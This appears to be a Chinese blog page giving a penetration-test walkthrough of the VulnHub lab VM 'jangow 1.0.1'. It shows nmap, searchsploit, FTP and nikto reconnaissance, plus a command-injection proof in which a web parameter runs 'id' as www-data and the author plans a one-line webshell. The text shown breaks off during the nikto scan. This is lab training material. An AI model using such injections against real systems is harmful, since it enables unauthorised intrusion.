-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
-</span></span><span style="display:flex;"><span>└─$ curl http://192.168.203.136/site/busque.php?buscar<span style="color:#ff6ac1">=</span>id
-</span></span><span style="display:flex;"><span><span style="color:#ff5c57">uid</span><span style="color:#ff6ac1">=</span>33<span style="color:#ff6ac1">(</span>www-data<span style="color:#ff6ac1">)</span> <span style="color:#ff5c57">gid</span><span style="color:#ff6ac1">=</span>33<span style="color:#ff6ac1">(</span>www-data<span style="color:#ff6ac1">)</span> <span style="color:#ff5c57">groups</span><span style="color:#ff6ac1">=</span>33<span style="color:#ff6ac1">(</span>www-data<span style="color:#ff6ac1">)</span></span></span></code></pre></div><p>结果把传的id带回来了，说明没有对传入参数进行限制，因此这里试试传一句话木马
+┌──(kali㉿kali)-[~] └─$ sudo nmap -sS -sV -sC -T4 192.168.203.136 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-28 06:07 EST Nmap scan report for 192.168.203.136 Host is up (0.0035s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 80/tcp open http Apache httpd 2.4.18 |_http-title: Index of / | http-ls: Volume / | SIZE TIME FILENAME | - 2021-06-10 18:05 site/ |_ |_http-server-header: Apache/2.4.18 (Ubuntu) MAC Address: 00:0C:29:17:B0:6C (VMware) Service Info: Host: 127.0.0.1; OS: Unix四、获得shell（失败）#searchsploit#┌──(kali㉿kali)-[~] └─$ searchsploit vsFTPd 3.0.3 -------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------------------------------------------------------- --------------------------------- vsftpd 3.0.3 - Remote Denial of Service | multiple/remote/49719.py -------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results目标主机FTP版本没有漏洞'><meta itemprop=datePublished content="2026-03-11T00:00:00+00:00"><meta itemprop=dateModified content="2026-05-26T21:52:47+08:00"><meta itemprop=wordCount content="1762"><title>jangow 1.0.1 | vnccer</title><link rel=icon href=/ak47.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://vnccer.github.io/docs/cybersecurity/vulnhub/easy/vulnhub_jangow_1.0.1/><link rel=stylesheet href=/book.min.736951ca3ba5472b01b559ccf11c0bd72daa52528001c9a2789c1ea4a2c2c765.css integrity="sha256-c2lRyjulRysBtVnM8RwL1y2qUlKAAcmieJwepKLCx2U=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.2f97d07853187a58b0d1c6f7546609fafa25e2267d955fa61f4874dde374b8b7.js integrity="sha256-L5fQeFMYeliw0cb3VGYJ+vol4iZ9lV+mH0h03eN0uLc=" crossorigin=anonymous></script><script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk=" crossorigin=anonymous></script><script>MathJax={tex:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"],["\\[","\\]"]],processEscapes:!0,processEnvironments:!0},options:{skipHtmlTags:["script","noscript","style","textarea","pre"]}}</script><script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script></head><body dir=ltr class="book-kind-page book-type-docs"><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/flamez.png alt=Logo><span>vnccer</span></a></h2><div class="book-search hidden"><input id=book-search-input type=text placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-c860f18c28389564163849da32ed5d14 class=toggle>
+<label for=section-c860f18c28389564163849da32ed5d14 class=flex><a role=button>Project</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/project/vigil/>vigil</a></li><li><a href=/docs/project/vigil-abandoned-version/>vigil(abandoned version)</a></li></ul></li><li><input type=checkbox id=section-8d58ff5c5e366ab14339daed9d222b7f class=toggle checked>
+<label for=section-8d58ff5c5e366ab14339daed9d222b7f class=flex><a href=/docs/cybersecurity/>网安</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-ad627e53d6d1828a1435a85961eea27f class=toggle>
+<label for=section-ad627e53d6d1828a1435a85961eea27f class=flex><a role=button>xnwlaqbc靶机记录</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/xnwlaqbc%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2%E4%B8%8E%E6%94%BB%E5%87%BB/>xnwlaqbc靶机部署与攻击</a></li><li><a href=/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/DDos%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95/>DDos攻击测试日志</a></li></ul></li><li><input type=checkbox id=section-20b418ba6aa317c76a5b35dea36ccbca class=toggle>
+<label for=section-20b418ba6aa317c76a5b35dea36ccbca class=flex><a href=/docs/cybersecurity/DVWA/>DVWA</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/DVWA/dvwa%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BF%AE%E5%A4%8D/>dvwa初始化修复</a></li><li><a href=/docs/cybersecurity/DVWA/Authorisation-Bypass/>Authorisation Bypass</a></li><li><a href=/docs/cybersecurity/DVWA/CSRF/>CSRF</a></li><li><a href=/docs/cybersecurity/DVWA/Open-HTTP-Redirect/>Open HTTP Redirect</a></li><li><a href=/docs/cybersecurity/DVWA/API/>api</a></li><li><a href=/docs/cybersecurity/DVWA/CSP-Bypass/>CSP Bypass</a></li><li><a href=/docs/cybersecurity/DVWA/Cyptography/>Cryptography</a></li><li><a href=/docs/cybersecurity/DVWA/Command-Injection/>Command Injection</a></li><li><a href=/docs/cybersecurity/DVWA/File-Inclusion/>File Inclusion</a></li><li><a href=/docs/cybersecurity/DVWA/SQL-Injection/>SQL Injection</a></li></ul></li><li><a href=/docs/cybersecurity/kali_linux%E5%9F%BA%E6%93%8D/>kali_linux基操</a></li><li><input type=checkbox id=section-aa6f3e63fd33f2e9fa1487b55c3551ba class=toggle>
+<label for=section-aa6f3e63fd33f2e9fa1487b55c3551ba class=flex><a role=button>SRC</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/SRC/stepfun/>漏洞盒子：阶跃星辰安全应急响应中心</a></li></ul></li><li><input type=checkbox id=section-4ae5ffa90962cdf2660fe74526a01436 class=toggle>
+<label for=section-4ae5ffa90962cdf2660fe74526a01436 class=flex><a role=button>Vulnerabilities</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnerabilities/Apache-Log4j2CVE-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/>基于docker的log4j2（CVE-2021-44228）漏洞（源问题复现失败）</a></li></ul></li><li><input type=checkbox id=section-e003e03c1feb2b65c7b35f539ae39c73 class=toggle checked>
+<label for=section-e003e03c1feb2b65c7b35f539ae39c73 class=flex><a role=button>VULNHUB</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-ac34f5c7f66ad3765e4c61f98a3f46fd class=toggle checked>
+<label for=section-ac34f5c7f66ad3765e4c61f98a3f46fd class=flex><a role=button>easy</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_drippingblues/>drippingblues</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_doubletrouble_1/>doubletrouble: 1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_Beelzebub_1/>Beelzebub: 1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_Empire_Breakout/>Empire Breakout</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_ICA_1/>ICA: 1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_jangow_1.0.1/ class=active>jangow 1.0.1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_Napping-1.0.1/>Napping: 1.0.1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_Noob_1/>Noob: 1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_The-planets_earth/>The planets earth</a></li></ul></li><li><input type=checkbox id=section-ad44293ee93b1d26cf7c58190e7d4815 class=toggle>
+<label for=section-ad44293ee93b1d26cf7c58190e7d4815 class=flex><a role=button>medium</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/medium/vulnhub_Corrosion2/>Corrosion: 2</a></li><li><a href=/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/>Thales</a></li><li><a href=/docs/cybersecurity/vulnhub/medium/vulnhub_Empire_lupinone/>Empire lupinone</a></li></ul></li><li><input type=checkbox id=section-fb378fb748ece0ae1fdeedef24da3db6 class=toggle>
+<label for=section-fb378fb748ece0ae1fdeedef24da3db6 class=flex><a role=button>hard</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/hard/vulnhub_Matrix-Breakout_-2_Morpheus/>Matrix-Breakout: 2 Morpheus</a></li></ul></li></ul></li><li><input type=checkbox id=section-5b607fcbb0b7c699a3da0e65a2ffed9b class=toggle>
+<label for=section-5b607fcbb0b7c699a3da0e65a2ffed9b class=flex><a role=button>CTF</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-7a6315a3240f7682f305097cdf53ea82 class=toggle>
+<label for=section-7a6315a3240f7682f305097cdf53ea82 class=flex><a role=button>easy</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/CTF/easy/CTF-web-low/>web-low</a></li></ul></li><li><input type=checkbox id=section-f08add9f101710f9ba3d484a35d5581b class=toggle>
+<label for=section-f08add9f101710f9ba3d484a35d5581b class=flex><a role=button>medium</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li><li><input type=checkbox id=section-1fdf586d1ea5885edf0672ce206f530c class=toggle>
+<label for=section-1fdf586d1ea5885edf0672ce206f530c class=flex><a role=button>hard</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li></ul></li></ul></li><li><input type=checkbox id=section-94ed7c835fd2d66c69e86ff967d092f9 class=toggle>
+<label for=section-94ed7c835fd2d66c69e86ff967d092f9 class=flex><a href=/docs/papers/>论文</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/papers/%E5%9F%BA%E4%BA%8E%E5%8F%AF%E5%8F%98%E9%95%BF%E5%BA%8F%E5%88%97%E7%9A%84%E6%81%B6%E6%84%8F%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/>基于可变长序列的恶意加密流量检测方法</a></li><li><a href=/docs/papers/ET-BERT/>ET-BERT</a></li><li><a href=/docs/papers/ET-BERT%E5%A4%8D%E7%8E%B0/>ET-BERT复现</a></li><li><a href=/docs/papers/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%9F%BA%E7%A1%80/>加密流量基础</a></li><li><a href=/docs/papers/%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%86%E6%9E%90/>数据集分析</a></li></ul></li><li><input type=checkbox id=section-3db2415e2c74c9bfbf1d5e6eb6dbf6ed class=toggle>
+<label for=section-3db2415e2c74c9bfbf1d5e6eb6dbf6ed class=flex><a role=button>工作</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/work/AI%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83/>AI安全思考</a></li><li><input type=checkbox id=section-2c262361fe9aa48cd5d939ca8724680d class=toggle>
+<label for=section-2c262361fe9aa48cd5d939ca8724680d class=flex><a role=button>leetcode</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-c1a97b113c65b26353860b399a4f8855 class=toggle>
+<label for=section-c1a97b113c65b26353860b399a4f8855 class=flex><a role=button>哈希</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/work/leetcode/1.%E5%93%88%E5%B8%8C/1.%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/>1.两数之和</a></li></ul></li></ul></li><li><a href=/docs/work/%E5%AE%9E%E4%B9%A0%E7%AE%80%E5%8E%86/>实习简历</a></li></ul></li><li><input type=checkbox id=section-8ebb29a2ddfb039e11169448c9cf3620 class=toggle>
+<label for=section-8ebb29a2ddfb039e11169448c9cf3620 class=flex><a href=/docs/skills/>技能</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/skills/Hugo%E6%9E%B6%E6%9E%84%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/>Hugo架构网站搭建指南</a></li><li><a href=/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/>anaconda环境配置</a></li><li><a href=/docs/skills/linux-clash%E9%83%A8%E7%BD%B2/>linux clash部署</a></li><li><a href=/docs/skills/pyenv%E7%AE%A1%E7%90%86python%E7%89%88%E6%9C%AC/>pyenv管理python版本</a></li><li><a href=/docs/skills/SwitchyOmega_mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/>SwitchyOmega_mv3操作记录</a></li><li><a href=/docs/skills/win+r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/>win+r常用指令</a></li><li><a href=/docs/skills/windows%E7%BB%88%E7%AB%AF%E8%B5%B0%E4%BB%A3%E7%90%86/>windows终端/git 走代理</a></li><li><a href=/docs/skills/%E5%9F%BA%E4%BA%8Evmware%E7%9A%84kali_linux%E4%B8%8B%E7%9A%84docker%E9%83%A8%E7%BD%B2%E5%9D%91%E5%A4%9A/>基于vmware的kali_linux下的docker部署(坑多)</a></li></ul></li><li><input type=checkbox id=section-d096fa83268a84183f67ef634318f12c class=toggle>
+<label for=section-d096fa83268a84183f67ef634318f12c class=flex><a href=/docs/AI/>AI</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/AI/claude-code-cli/>claude code cli</a></li><li><a href=/docs/AI/%E4%B8%BB%E6%B5%81AI%E5%AE%9A%E4%BB%B7/>主流AI定价</a></li></ul></li><li><input type=checkbox id=section-854542c26bded6389f67b522f4182c5e class=toggle>
+<label for=section-854542c26bded6389f67b522f4182c5e class=flex><a role=button>导航门户</a>
+<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/navigation/%E7%BD%91%E5%AE%89/>网安</a></li><li><a href=/docs/navigation/%E8%AE%BA%E6%96%87/>论文</a></li><li><a href=/docs/navigation/%E5%B7%A5%E4%BD%9C/>工作</a></li><li><a href=/docs/navigation/Function/>Function</a></li><li><a href=/docs/navigation/AI/>AI</a></li><li><a href=/docs/navigation/Life/>Life</a></li><li><a href=/docs/navigation/%E5%B9%B3%E5%8F%B0/>平台</a></li><li><a href=/docs/navigation/%E6%9C%BA%E5%9C%BA/>机场</a></li></ul></li></ul><ul><li><a href=/posts/ title=Blog>Blog</a></li><li><a href=https://github.com/vnccer target=_blank rel=noopener>Github</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class="book-header hidden"><div class="flex align-center justify-between"><label for=menu-control><img src=/icons/menu.svg class=book-icon alt=Menu></label><h3>jangow 1.0.1</h3><label for=toc-control><img src=/icons/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class=hidden><nav id=TableOfContents><ul><li><ul><li><a href=#一靶机网卡修复>一、靶机网卡修复</a></li><li><a href=#二识别靶机ip>二、识别靶机ip</a></li><li><a href=#三端口扫描nmap>三、端口扫描nmap</a></li><li><a href=#四获得shell失败>四、获得shell（失败）</a><ul><li><a href=#searchsploit>searchsploit</a></li><li><a href=#ftp>FTP</a></li></ul></li><li><a href=#五http扫描>五、HTTP扫描</a><ul><li><a href=#nikto>nikto</a></li><li><a href=#目录扫描dirb>目录扫描dirb</a></li><li><a href=#wpscan>wpscan</a></li><li><a href=#gobuster>gobuster</a></li><li><a href=#网页url>网页URL</a></li></ul></li><li><a href=#六反弹shell>六、反弹shell</a></li><li><a href=#七提权>七、提权</a></li><li><a href=#八总结>八、总结</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h2 id=一靶机网卡修复>一、靶机网卡修复<a class=anchor href=#%e4%b8%80%e9%9d%b6%e6%9c%ba%e7%bd%91%e5%8d%a1%e4%bf%ae%e5%a4%8d>#</a></h2><p>将靶机网络模式修改为<strong>NAT模式</strong>，按<code>shift</code>，选择第二个回车，再选择第二个，按<code>e</code>，删除"recovery nomodeset"并在末尾添加"quiet splash rw init=/bin/bash，<code>ctrl + x</code>在新的红色界面<code>sudo vim /etc/network/interfaces</code>（尽量用tab键补全），将网卡信息修改为<code>ens33</code>，这里键盘映射问题，无法直接输入<code>:wq</code>，所以先大写，按住<code>shift</code>，再双击<code>Z</code>，接着重置</p><h2 id=二识别靶机ip>二、识别靶机ip<a class=anchor href=#%e4%ba%8c%e8%af%86%e5%88%ab%e9%9d%b6%e6%9c%baip>#</a></h2><p><code>sudo arp-scan -l</code>，靶机ip为<code>192.168.203.136</code></p><h2 id=三端口扫描nmap>三、端口扫描nmap<a class=anchor href=#%e4%b8%89%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8fnmap>#</a></h2><p>快速扫描</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
+</span></span><span style=display:flex><span>└─$ sudo nmap -sS -sV -sC -T4 192.168.203.136
+</span></span><span style=display:flex><span>Starting Nmap 7.95 <span style=color:#ff6ac1>(</span> https://nmap.org <span style=color:#ff6ac1>)</span> at 2026-01-28 06:07 EST
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#ff6ac1>for</span> 192.168.203.136
+</span></span><span style=display:flex><span>Host is up <span style=color:#ff6ac1>(</span>0.0035s latency<span style=color:#ff6ac1>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ff9f43>998</span> filtered tcp ports <span style=color:#ff6ac1>(</span>no-response<span style=color:#ff6ac1>)</span>
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.18
+</span></span><span style=display:flex><span>|_http-title: Index of /
+</span></span><span style=display:flex><span>| http-ls: Volume /
+</span></span><span style=display:flex><span>| SIZE  TIME              FILENAME
+</span></span><span style=display:flex><span>| -     2021-06-10 18:05  site/
+</span></span><span style=display:flex><span>|_
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.18 <span style=color:#ff6ac1>(</span>Ubuntu<span style=color:#ff6ac1>)</span>
+</span></span><span style=display:flex><span>MAC Address: 00:0C:29:17:B0:6C <span style=color:#ff6ac1>(</span>VMware<span style=color:#ff6ac1>)</span>
+</span></span><span style=display:flex><span>Service Info: Host: 127.0.0.1; OS: Unix</span></span></code></pre></div><h2 id=四获得shell失败>四、获得shell（失败）<a class=anchor href=#%e5%9b%9b%e8%8e%b7%e5%be%97shell%e5%a4%b1%e8%b4%a5>#</a></h2><h3 id=searchsploit>searchsploit<a class=anchor href=#searchsploit>#</a></h3><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
+</span></span><span style=display:flex><span>└─$ searchsploit vsFTPd 3.0.3                
+</span></span><span style=display:flex><span>-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span> Exploit Title                                                                                                            |  Path
+</span></span><span style=display:flex><span>-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span>vsftpd 3.0.3 - Remote Denial of Service                                                                                   | multiple/remote/49719.py
+</span></span><span style=display:flex><span>-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span>Shellcodes: No Results</span></span></code></pre></div><p>目标主机FTP版本没有漏洞</p><h3 id=ftp>FTP<a class=anchor href=#ftp>#</a></h3><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
+</span></span><span style=display:flex><span>└─$ ftp 192.168.203.136
+</span></span><span style=display:flex><span>Connected to 192.168.203.136.
+</span></span><span style=display:flex><span><span style=color:#ff9f43>220</span> <span style=color:#ff6ac1>(</span>vsFTPd 3.0.3<span style=color:#ff6ac1>)</span>
+</span></span><span style=display:flex><span>Name <span style=color:#ff6ac1>(</span>192.168.203.136:kali<span style=color:#ff6ac1>)</span>: anonymous
+</span></span><span style=display:flex><span><span style=color:#ff9f43>331</span> Please specify the password.
+</span></span><span style=display:flex><span>Password: 
+</span></span><span style=display:flex><span><span style=color:#ff9f43>530</span> Login incorrect.
+</span></span><span style=display:flex><span>ftp: Login failed
+</span></span><span style=display:flex><span>ftp&gt; quit
+</span></span><span style=display:flex><span><span style=color:#ff9f43>221</span> Goodbye.</span></span></code></pre></div><p>不允许匿名访问</p><h2 id=五http扫描>五、HTTP扫描<a class=anchor href=#%e4%ba%94http%e6%89%ab%e6%8f%8f>#</a></h2><h3 id=nikto>nikto<a class=anchor href=#nikto>#</a></h3><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
+</span></span><span style=display:flex><span>└─$ nikto -h http://192.168.203.136
+</span></span><span style=display:flex><span>- Nikto v2.5.0
+</span></span><span style=display:flex><span>---------------------------------------------------------------------------
+</span></span><span style=display:flex><span>+ Target IP:          192.168.203.136
+</span></span><span style=display:flex><span>+ Target Hostname:    192.168.203.136
+</span></span><span style=display:flex><span>+ Target Port:        <span style=color:#ff9f43>80</span>
+</span></span><span style=display:flex><span>+ Start Time:         2026-01-29 03:33:55 <span style=color:#ff6ac1>(</span>GMT-5<span style=color:#ff6ac1>)</span>
+</span></span><span style=display:flex><span>---------------------------------------------------------------------------
+</span></span><span style=display:flex><span>+ Server: Apache/2.4.18 <span style=color:#ff6ac1>(</span>Ubuntu<span style=color:#ff6ac1>)</span>
+</span></span><span style=display:flex><span>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+</span></span><span style=display:flex><span>+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+</span></span><span style=display:flex><span>+ /: Directory indexing found.
+</span></span><span style=display:flex><span>+ No CGI Directories found <span style=color:#ff6ac1>(</span>use <span style=color:#5af78e>&#39;-C all&#39;</span> to force check all possible <span style=color:#ff5c57>dirs</span><span style=color:#ff6ac1>)</span>
+</span></span><span style=display:flex><span>+ Apache/2.4.18 appears to be outdated <span style=color:#ff6ac1>(</span>current is at least Apache/2.4.54<span style=color:#ff6ac1>)</span>. Apache 2.2.34 is the EOL <span style=color:#ff6ac1>for</span> the 2.x branch.
+</span></span><span style=display:flex><span>+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+</span></span><span style=display:flex><span>+ /./: Directory indexing found.
+</span></span><span style=display:flex><span>+ /./: Appending <span style=color:#5af78e>&#39;/./&#39;</span> to a directory allows indexing.
+</span></span><span style=display:flex><span>+ //: Directory indexing found.
+</span></span><span style=display:flex><span>+ //: Apache on Red Hat Linux release <span style=color:#ff9f43>9</span> reveals the root directory listing by default <span style=color:#ff6ac1>if</span> there is no index page.
+</span></span><span style=display:flex><span>+ /%2e/: Directory indexing found.
+</span></span><span style=display:flex><span>+ /%2e/: Weblogic allows <span style=color:#ff5c57>source</span> code or directory listing, upgrade to v6.0 SP1 or higher. See: http://www.securityfocus.com/bid/2513
+</span></span><span style=display:flex><span>+ ///: Directory indexing found.
+</span></span><span style=display:flex><span>+ /?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via <span style=color:#5af78e>&#39;open directory browsing&#39;</span>. Web Publisher should be disabled. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name<span style=color:#ff6ac1>=</span>CVE-1999-0269
+</span></span><span style=display:flex><span>+ /?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via <span style=color:#5af78e>&#39;open directory browsing&#39;</span>. Web Publisher should be disabled. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name<span style=color:#ff6ac1>=</span>CVE-1999-0269
+</span></span><span style=display:flex><span>+ ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
+</span></span><span style=display:flex><span>+ ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when multiple /<span style=color:#5af78e>&#39;s are requested. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1078
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>+ 8102 requests: 0 error(s) and 17 item(s) reported on remote host
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>+ End Time:           2026-01-29 03:34:05 (GMT-5) (10 seconds)
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>---------------------------------------------------------------------------
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>+ 1 host(s) tested
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>┌──(kali㉿kali)-[~]
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>└─$ nikto -h http://192.168.203.136/site/
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>- Nikto v2.5.0
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>---------------------------------------------------------------------------
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>+ Target IP:          192.168.203.136
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>+ Target Hostname:    192.168.203.136
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>+ Target Port:        80
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>+ Start Time:         2026-01-29 03:39:13 (GMT-5)
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>---------------------------------------------------------------------------
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>+ Server: Apache/2.4.18 (Ubuntu)
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>+ /site/: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>+ /site/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+</span></span></span><span style=display:flex><span><span style=color:#5af78e>+ No CGI Directories found (use &#39;</span>-C all<span style=color:#ff5c57>&#39;</span> to force check all possible <span style=color:#ff5c57>dirs</span><span style=color:#ff6ac1>)</span>
